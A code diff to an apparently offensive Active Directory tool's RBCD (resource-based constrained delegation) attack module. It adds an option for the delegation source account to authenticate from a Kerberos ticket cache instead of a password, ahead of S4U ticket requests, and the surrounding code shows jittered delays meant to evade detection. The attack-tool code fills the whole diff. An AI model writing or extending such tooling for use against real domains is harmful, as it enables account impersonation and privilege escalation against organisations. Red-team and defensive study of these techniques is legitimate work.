@@ -31,6 +31,7 @@ class RBCDConfig:
     target_spn:         Optional[str] = None
     delegate_account:   Optional[str] = None
     delegate_pass:      Optional[str] = None
+    delegate_ccache:   Optional[str] = None
     add_computer:       bool  = False
     new_computer_name:  Optional[str] = None
     new_computer_pass:  Optional[str] = None
@@ -324,9 +325,9 @@ def run_rbcd(auth: AuthContext, config: RBCDConfig) -> Optional[TicketResult]:
 
     elif config.delegate_account:
         delegate_sam = config.delegate_account
-        if not delegate_pass:
+        if not delegate_pass and not config.delegate_ccache:
             error("Delegation source account specified but no password provided.\n"
-                  "  Use --delegate-pass to provide the account password.")
+                  "  Use --delegate-pass or --delegate-ccache.")
             return None
     else:
         error("No delegation source account specified.\n"
@@ -363,11 +364,23 @@ def run_rbcd(auth: AuthContext, config: RBCDConfig) -> Optional[TicketResult]:
         info(f"Waiting {config.delay_ms}ms before S4U requests...")
         jittered_sleep(config.delay_ms, config.jitter_pct)
 
-    delegate_auth = auth_password(
-        username=delegate_sam.rstrip("$"),
-        domain=config.domain,
-        password=delegate_pass,
-    )
+    # Use ccache auth if provided, otherwise password auth
+    if config.delegate_ccache:
+        from core.auth import auth_ccache
+        import os
+        os.environ["KRB5CCNAME"] = config.delegate_ccache
+        delegate_auth = auth_ccache(
+            username=delegate_sam.rstrip("$"),
+            domain=config.domain,
+            ccache_path=config.delegate_ccache,
+        )
+        info(f"Using ccache auth for delegation source: {config.delegate_ccache}")
+    else:
+        delegate_auth = auth_password(
+            username=delegate_sam.rstrip("$"),
+            domain=config.domain,
+            password=delegate_pass,
+        )
 
     delegate_clean = delegate_sam.rstrip("$")
     delegate_spn   = f"HOST/{delegate_clean}.{config.domain}"
